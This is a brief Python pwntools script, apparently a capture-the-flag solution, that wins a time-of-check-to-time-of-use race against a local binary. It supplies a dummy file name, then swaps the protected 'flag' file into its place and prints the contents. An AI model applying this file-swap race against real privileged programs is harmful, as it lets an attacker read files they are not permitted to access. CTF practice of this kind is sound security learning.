from pwn import *
import os

binary = ELF('./caffeinated-tocttou')
comm = process(binary.path)

# create a temp file that will be replaced 
# for flag
open('something', 'a').close()
comm.recvuntil(b'open')
comm.sendline(b'something')

# rename flag as temp file
os.rename('flag', 'something')

# print flag
comm.recvuntil(b'the file!!!\n')
print(comm.recvuntil(b'}'))
os.rename('something', 'flag')
